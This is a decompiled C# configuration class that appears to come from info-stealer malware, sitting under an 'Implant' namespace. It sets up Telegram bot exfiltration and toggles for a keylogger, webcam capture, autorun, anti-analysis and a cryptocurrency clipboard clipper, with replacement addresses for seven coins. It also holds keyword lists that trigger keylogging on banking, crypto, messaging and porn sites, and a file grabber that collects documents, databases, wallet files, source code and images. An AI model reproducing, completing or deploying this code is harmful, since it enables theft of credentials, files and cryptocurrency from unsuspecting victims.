using System;
using System.Collections.Generic;
using Client.BrowserConfig.Implant;

namespace Client.BrowserConfig
{
	// Token: 0x02000004 RID: 4
	internal sealed class Config
	{
		// Token: 0x06000005 RID: 5 RVA: 0x000020D0 File Offset: 0x000002D0
		public static void Init()
		{
			Config.TelegramAPI = StringsCrypt.DecryptConfig(Config.TelegramAPI);
			Config.TelegramID = StringsCrypt.DecryptConfig(Config.TelegramID);
			bool flag = Config.ClipperModule == "1";
			if (flag)
			{
				Config.ClipperAddresses["btc"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["btc"]);
				Config.ClipperAddresses["eth"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["eth"]);
				Config.ClipperAddresses["xmr"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["xmr"]);
				Config.ClipperAddresses["xlm"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["xlm"]);
				Config.ClipperAddresses["xrp"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["xrp"]);
				Config.ClipperAddresses["ltc"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["ltc"]);
				Config.ClipperAddresses["bch"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["bch"]);
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002220 File Offset: 0x00000420
		// Note: this type is marked as 'beforefieldinit'.
		static Config()
		{
			Dictionary<string, string[]> dictionary = new Dictionary<string, string[]>();
			dictionary["Document"] = new string[]
			{
				"pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt",
				"json"
			};
			dictionary["DataBase"] = new string[]
			{
				"db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk",
				"dbf", "wallet", "ini"
			};
			dictionary["SourceCode"] = new string[]
			{
				"c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php",
				"go", "js", "rb", "pl", "swift", "java", "kt", "kts", "ino"
			};
			dictionary["Image"] = new string[] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" };
			Config.GrabberFileTypes = dictionary;
		}

		// Token: 0x04000001 RID: 1
		public static string TelegramAPI = "--- Telegram API ---";

		// Token: 0x04000002 RID: 2
		public static string TelegramID = "--- Telegram ID ---";

		// Token: 0x04000003 RID: 3
		public static string Mutex = "--- Mutex ---";

		// Token: 0x04000004 RID: 4
		public static string AntiAnalysis = "--- AntiAnalysis ---";

		// Token: 0x04000005 RID: 5
		public static string Autorun = "--- Startup ---";

		// Token: 0x04000006 RID: 6
		public static string StartDelay = "--- StartDelay ---";

		// Token: 0x04000007 RID: 7
		public static string WebcamScreenshot = "--- WebcamScreenshot ---";

		// Token: 0x04000008 RID: 8
		public static string KeyloggerModule = "--- Keylogger ---";

		// Token: 0x04000009 RID: 9
		public static string ClipperModule = "--- Clipper ---";

		// Token: 0x0400000A RID: 10
		public static Dictionary<string, string> ClipperAddresses = new Dictionary<string, string>
		{
			{ "btc", "--- ClipperBTC ---" },
			{ "eth", "--- ClipperETH ---" },
			{ "xmr", "--- ClipperXMR ---" },
			{ "xlm", "--- ClipperXLM ---" },
			{ "xrp", "--- ClipperXRP ---" },
			{ "ltc", "--- ClipperLTC ---" },
			{ "bch", "--- ClipperBCH ---" }
		};

		// Token: 0x0400000B RID: 11
		public static string[] KeyloggerServices = new string[]
		{
			"facebook", "twitter", "chat", "telegram", "skype", "discord", "viber", "message", "gmail", "protonmail",
			"outlook", "password", "encryption", "account", "login", "key", "sign in", "пароль", "bank", "банк",
			"credit", "card", "кредит", "shop", "buy", "sell", "купить"
		};

		// Token: 0x0400000C RID: 12
		public static string[] BankingServices = new string[] { "qiwi", "money", "exchange", "bank", "credit", "card", "банк", "кредит" };

		// Token: 0x0400000D RID: 13
		public static string[] CryptoServices = new string[]
		{
			"bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin", "btc", "eth", "xmr", "xlm",
			"xrp", "ltc", "bch", "blockchain", "paxful", "investopedia", "buybitcoinworldwide", "cryptocurrency", "crypto", "trade",
			"trading", "биткоин", "wallet"
		};

		// Token: 0x0400000E RID: 14
		public static string[] PornServices = new string[] { "porn", "sex", "hentai", "порно", "sex" };

		// Token: 0x0400000F RID: 15
		public static int GrabberSizeLimit = 5120;

		// Token: 0x04000010 RID: 16
		public static Dictionary<string, string[]> GrabberFileTypes;
	}
}
